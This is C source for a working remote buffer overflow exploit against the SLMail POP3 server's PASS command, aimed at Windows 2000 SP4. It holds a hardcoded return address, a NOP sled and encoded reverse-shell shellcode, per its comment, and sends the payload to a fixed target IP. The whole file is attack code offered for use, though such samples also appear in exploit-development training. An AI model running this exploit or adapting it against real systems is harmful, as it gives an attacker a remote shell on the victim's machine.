#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\xD8\xFC\x91\x7C" /*win2k server sp4 0x7C 91 FC D8*/
#define port 110

/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xdb\xca\xb8\x26\x4b\xbc\x5d\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x17\x83\xc3\x04\x03\x65\x58\x5e\xa8\x95\xb6\x1c"
"\x53\x65\x47\x41\xdd\x80\x76\x41\xb9\xc1\x29\x71\xc9\x87\xc5"
"\xfa\x9f\x33\x5d\x8e\x37\x34\xd6\x25\x6e\x7b\xe7\x16\x52\x1a"
"\x6b\x65\x87\xfc\x52\xa6\xda\xfd\x93\xdb\x17\xaf\x4c\x97\x8a"
"\x5f\xf8\xed\x16\xd4\xb2\xe0\x1e\x09\x02\x02\x0e\x9c\x18\x5d"
"\x90\x1f\xcc\xd5\x99\x07\x11\xd3\x50\xbc\xe1\xaf\x62\x14\x38"
"\x4f\xc8\x59\xf4\xa2\x10\x9e\x33\x5d\x67\xd6\x47\xe0\x70\x2d"
"\x35\x3e\xf4\xb5\x9d\xb5\xae\x11\x1f\x19\x28\xd2\x13\xd6\x3e"
"\xbc\x37\xe9\x93\xb7\x4c\x62\x12\x17\xc5\x30\x31\xb3\x8d\xe3"
"\x58\xe2\x6b\x45\x64\xf4\xd3\x3a\xc0\x7f\xf9\x2f\x79\x22\x96"
"\x9c\xb0\xdc\x66\x8b\xc3\xaf\x54\x14\x78\x27\xd5\xdd\xa6\xb0"
"\x1a\xf4\x1f\x2e\xe5\xf7\x5f\x67\x22\xa3\x0f\x1f\x83\xcc\xdb"
"\xdf\x2c\x19\x4b\x8f\x82\xf2\x2c\x7f\x63\xa3\xc4\x95\x6c\x9c"
"\xf5\x96\xa6\xb5\x9c\x6d\x21\x7a\xc8\x74\x7f\x12\x0b\x86\x7e"
"\x58\x82\x60\xea\x8e\xc3\x3b\x83\x37\x4e\xb7\x32\xb7\x44\xb2"
"\x75\x33\x6b\x43\x3b\xb4\x06\x57\xac\x34\x5d\x05\x7b\x4a\x4b"
"\x21\xe7\xd9\x10\xb1\x6e\xc2\x8e\xe6\x27\x34\xc7\x62\xda\x6f"
"\x71\x90\x27\xe9\xba\x10\xfc\xca\x45\x99\x71\x76\x62\x89\x4f"
"\x77\x2e\xfd\x1f\x2e\xf8\xab\xd9\x98\x4a\x05\xb0\x77\x05\xc1"
"\x45\xb4\x96\x97\x49\x91\x60\x77\xfb\x4c\x35\x88\x34\x19\xb1"
"\xf1\x28\xb9\x3e\x28\xe9\xc9\x74\x70\x58\x42\xd1\xe1\xd8\x0f"
"\xe2\xdc\x1f\x36\x61\xd4\xdf\xcd\x79\x9d\xda\x8a\x3d\x4e\x97"
"\x83\xab\x70\x04\xa3\xf9";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2607);
    memset(off, 0x00, 2607);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("192.168.25.114");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
